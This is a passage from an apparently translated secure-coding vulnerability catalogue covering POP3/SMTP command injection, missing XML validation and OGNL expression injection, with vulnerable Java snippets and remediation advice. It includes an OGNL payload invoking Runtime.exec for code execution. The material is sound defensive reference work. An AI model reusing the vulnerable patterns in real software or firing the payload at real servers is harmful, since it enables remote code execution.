<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String username = request.getParameter(&quot;username&quot;);</span><br><span class="line"></span><br><span class="line">String password = request.getParameter(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">POP3SClient pop3 = new POP3SClient(proto, false);</span><br><span class="line"></span><br><span class="line">pop3.login(username, password)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-296"><a href="#RECOMMENDATIONS-296" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户直接控制由程序执行的 POP3 命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。</p>
<p>在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发者通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。如果不这样，建议使用白名单，以便接受完全由这些经认可的字符组成的输入。</p>
<h5 id="REFERENCES-295"><a href="#REFERENCES-295" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</p>
<p>[2] Vicente Aguilera Díaz MX Injection: Capturing and Exploiting Hidden Mail Servers</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 93</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 078</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 078</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Mail Command Injection (WASC-30)</p>
<h4 id="Mail-Command-Injection-SMTP"><a href="#Mail-Command-Injection-SMTP" class="headerlink" title="Mail Command Injection: SMTP"></a>Mail Command Injection: SMTP</h4><h5 id="ABSTRACT-297"><a href="#ABSTRACT-297" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从不可信赖数据源执行 SMTP 命令，可能会导致 SMTP 服务器以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-298"><a href="#EXPLANATION-298" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者可以影响发送到 SMTP 邮件服务器的命令时，就会发生 SMTP Command Injection 漏洞。</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。</p>
</li>
<li><p>通过执行 SMTP 命令，攻击者能够指示服务器执行恶意操作，例如发送垃圾邮件。</p>
</li>
</ol>
<p>示例 1：以下代码使用 HTTP 请求参数来构建将发送到 SMTP 服务器的 VRFY 命令。攻击者可以利用此参数修改发送到服务器的命令，并使用 CRLF 字符注入新命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String user = request.getParameter(&quot;user&quot;);</span><br><span class="line"></span><br><span class="line">SMTPSSLTransport transport = new SMTPSSLTransport(session,new URLName(Utilities.getProperty(&quot;smtp.server&quot;)));</span><br><span class="line"></span><br><span class="line">transport.connect(Utilities.getProperty(&quot;smtp.server&quot;), username, password);</span><br><span class="line"></span><br><span class="line">transport.simpleCommand(&quot;VRFY &quot; + user);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-297"><a href="#RECOMMENDATIONS-297" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户直接控制由程序执行的 SMTP 命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。</p>
<p>在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发者通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。如果不这样，建议使用白名单，以便接受完全由这些经认可的字符组成的输入。</p>
<h5 id="REFERENCES-296"><a href="#REFERENCES-296" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</p>
<p>[2] Vicente Aguilera Díaz MX Injection: Capturing and Exploiting Hidden Mail Servers</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 93</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 078</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 078</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Mail Command Injection (WASC-30)</p>
<h4 id="Missing-XML-Validation"><a href="#Missing-XML-Validation" class="headerlink" title="Missing XML Validation"></a>Missing XML Validation</h4><h5 id="ABSTRACT-298"><a href="#ABSTRACT-298" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>解析 XML 时，无法进行校验会给攻击者提供恶意输入的机会。</p>
<h5 id="EXPLANATION-299"><a href="#EXPLANATION-299" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>最成功的攻击往往会从违反程序员的假设开始。不经过 DTD 或 XML schema 的校验，就直接接受 XML 文档，这样一来，程序员就会为攻击者打开了一扇大门，可以向程序提供无法预测、不合理或是恶意的输入。当然，XML 解析器不可能校验文档中出现的所有内容；任何解析器都无法完全理解数据的全部语意。然而，解析器可以进行完整而彻底的检查文档结构，从而保证处理文档的代码在内容安排上的合理性。</p>
<h5 id="RECOMMENDATIONS-298"><a href="#RECOMMENDATIONS-298" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>若创建 XML 解析器或解析器代理，务必启用校验功能。由于用来定义结构的文件规则错综复杂，或是人们完全不了解，而给校验带来了一些问题，那么在其附近有可能潜藏着某些安全漏洞。</p>
<p>下面的例子演示了如何启用 Xerces 解析器的校验功能（包括 DOM 和 SAX）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.xerces.framework.XMLParser: parser.setValidation(true);</span><br><span class="line"></span><br><span class="line">org.apache.xerces.framework.XMLParser: parser.setValidationSchema(true);</span><br></pre></td></tr></table></figure>
<p>接下来的例子演示了如何在 javax 库中为 SAX 和 DOM 解析器代理启用校验功能。</p>
<p>javax SAX 解析器代理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.SAXParserFactory: factory.setValidating(true);</span><br><span class="line"></span><br><span class="line">javax.xml.parsers.SAXParserFactory: factory.setFeature(&quot;http://xml.org/sax/features/validation&quot;, true);</span><br></pre></td></tr></table></figure>
<p>javax DOM 解析器代理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory: factory.setValidating(true);</span><br></pre></td></tr></table></figure>
<p>接下来的各个例子演示了如何在 javax 库中为单个解析器和 XMLReaders 启用校验功能。</p>
<p>注意：Fortify 软件安全研究团队不建议采用这种方法启用校验功能。相反，您应在解析器代理中启用校验功能。</p>
<p>javax SAX 解析器和读取器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.SAXParser: parser.setProperty(&quot;http://xml.org/sax/features/validation&quot;, new Boolean(true));</span><br><span class="line"></span><br><span class="line">org.xml.sax.XMLReader: reader.setFeature(&quot;http://xml.org/sax/features/validation&quot;, true);</span><br></pre></td></tr></table></figure>
<p>以下示例将显示如何为 Apache Axis 设置 XML 返回类型。</p>
<p>Axis 客户端调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call.addParameter(&quot;testParam&quot;, org.apache.axis.Constants.XSD_STRING, javax.xml.rpc.ParameterMode.IN);</span><br><span class="line"></span><br><span class="line">call.setReturnType(org.apache.axis.Constants.XSD_STRING);</span><br><span class="line"></span><br><span class="line">String ret = (String) call.invoke( new Object[] &#123; &quot;Hello!&quot; &#125; );</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-297"><a href="#REFERENCES-297" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Xerces parser features The Apache Foundation</p>
<p>[2] XML Validation in J2SE 1.5 Sun Microsystems</p>
<p>[3] Axis User’s Guide Apache Software Foundation</p>
<p>[4] IDS16-J. Prevent XML Injection CERT</p>
<p>[5] IDS17-J. Prevent XML External Entity Attacks CERT</p>
<p>[6] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 112</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 6.5.6</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Missing-XML-Validation-Untyped-Response"><a href="#Missing-XML-Validation-Untyped-Response" class="headerlink" title="Missing XML Validation: Untyped Response"></a>Missing XML Validation: Untyped Response</h4><h5 id="ABSTRACT-299"><a href="#ABSTRACT-299" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>解析 XML 时，无法进行校验会给攻击者提供恶意输入的机会。</p>
<h5 id="EXPLANATION-300"><a href="#EXPLANATION-300" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>最成功的攻击往往会从违反程序员的假设开始。不经过 DTD 或 XML schema 的校验，就直接接受 XML 文档，这样一来，程序员就会为攻击者打开了一扇大门，可以向程序提供无法预测、不合理或是恶意的输入。当然，XML 解析器不可能校验文档中出现的所有内容；任何解析器都无法完全理解数据的全部语意。然而，解析器可以进行完整而彻底的检查文档结构，从而保证处理文档的代码在内容安排上的合理性。</p>
<h5 id="RECOMMENDATIONS-299"><a href="#RECOMMENDATIONS-299" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>若创建 XML 解析器或解析器代理，务必启用校验功能。由于用来定义结构的文件规则错综复杂，或是人们完全不了解，而给校验带来了一些问题，那么在其附近有可能潜藏着某些安全漏洞。</p>
<p>下面的例子演示了如何启用 Xerces 解析器的校验功能（包括 DOM 和 SAX）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.xerces.framework.XMLParser: parser.setValidation(true);</span><br><span class="line"></span><br><span class="line">org.apache.xerces.framework.XMLParser: parser.setValidationSchema(true);</span><br></pre></td></tr></table></figure>
<p>接下来的例子演示了如何在 javax 库中为 SAX 和 DOM 解析器代理启用校验功能。</p>
<p>javax SAX 解析器代理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.SAXParserFactory: factory.setValidating(true);</span><br><span class="line"></span><br><span class="line">javax.xml.parsers.SAXParserFactory: factory.setFeature(&quot;http://xml.org/sax/features/validation&quot;, true);</span><br></pre></td></tr></table></figure>
<p>javax DOM 解析器代理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory: factory.setValidating(true);</span><br></pre></td></tr></table></figure>
<p>接下来的各个例子演示了如何在 javax 库中为单个解析器和 XMLReaders 启用校验功能。</p>
<p>注意：Fortify 软件安全研究团队不建议采用这种方法启用校验功能。相反，您应在解析器代理中启用校验功能。</p>
<p>javax SAX 解析器和读取器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.SAXParser: parser.setProperty(&quot;http://xml.org/sax/features/validation&quot;, new Boolean(true));</span><br><span class="line"></span><br><span class="line">org.xml.sax.XMLReader: reader.setFeature(&quot;http://xml.org/sax/features/validation&quot;, true);</span><br></pre></td></tr></table></figure>
<p>以下示例将显示如何为 Apache Axis 设置 XML 返回类型。</p>
<p>Axis 客户端调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call.addParameter(&quot;testParam&quot;, org.apache.axis.Constants.XSD_STRING, javax.xml.rpc.ParameterMode.IN);</span><br><span class="line"></span><br><span class="line">call.setReturnType(org.apache.axis.Constants.XSD_STRING);</span><br><span class="line"></span><br><span class="line">String ret = (String) call.invoke( new Object[] &#123; &quot;Hello!&quot; &#125; );</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-298"><a href="#REFERENCES-298" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Xerces parser features The Apache Foundation</p>
<p>[2] XML Validation in J2SE 1.5 Sun Microsystems</p>
<p>[3] Axis User’s Guide Apache Software Foundation</p>
<p>[4] IDS16-J. Prevent XML Injection CERT</p>
<p>[5] IDS17-J. Prevent XML External Entity Attacks CERT</p>
<p>[6] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 112</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 6.5.6</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="OGNL-Expression-Injection"><a href="#OGNL-Expression-Injection" class="headerlink" title="OGNL Expression Injection"></a>OGNL Expression Injection</h4><h5 id="ABSTRACT-300"><a href="#ABSTRACT-300" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>计算未验证的 OGNL 表达式可能导致执行远程代码。</p>
<h5 id="EXPLANATION-301"><a href="#EXPLANATION-301" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>对象图导航语言 (OGNL) 是一种针对 Java 的开源表达式语言 (EL)，它允许在由开发者提供的环境中计算并执行 EL 表达式。允许在任何环境下计算未验证的表达式将允许攻击者执行任意代码。</p>
<p>在以下示例中，应用程序使用由用户控制的未验证数据创建 OGNL 表达式的计算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext ctx = new OgnlContext();</span><br><span class="line"></span><br><span class="line">String expression = request.getParameter(&quot;input&quot;);</span><br><span class="line"></span><br><span class="line">Object expr = Ognl.parseExpression(expression);</span><br><span class="line"></span><br><span class="line">Object value = Ognl.getValue(expr, ctx, root);</span><br><span class="line"></span><br><span class="line">System.out.println(&quot;Value: &quot; + value);</span><br></pre></td></tr></table></figure>
<p>攻击者可以提交以下表达式以在应用程序服务器环境中执行任意代码：</p>
<p><code>(#rt = @java.lang.Runtime@getRuntime(),#rt.exec(&quot;calc.exe&quot;))</code></p>
<h5 id="RECOMMENDATIONS-300"><a href="#RECOMMENDATIONS-300" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>OGNL 表达式应被视作代码，因此不应允许用户提交要在应用程序服务器上运行的任意代码。所以，用户控制的字符串不应被解析为 OGNL 表达式。如果需要，开发人员应使用白名单仔细过滤并验证用户控制的表达式并仅允许所需的字符和表达式。</p>
<h5 id="REFERENCES-299"><a href="#REFERENCES-299" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Apache Commons OGNL - Object Graph Navigation Library</p>
<p>[2] Meder Kydyraliev Milking a horse or executing remote code in modern Java frameworks</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="OGNL-Expression-Injection-Double-Evaluation"><a href="#OGNL-Expression-Injection-Double-Evaluation" class="headerlink" title="OGNL Expression Injection: Double Evaluation"></a>OGNL Expression Injection: Double Evaluation</h4><h5 id="ABSTRACT-301"><a href="#ABSTRACT-301" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>双重 OGNL 评估允许攻击者在控制第一次评估的输出时，评估任意 OGNL 表达式。</p>
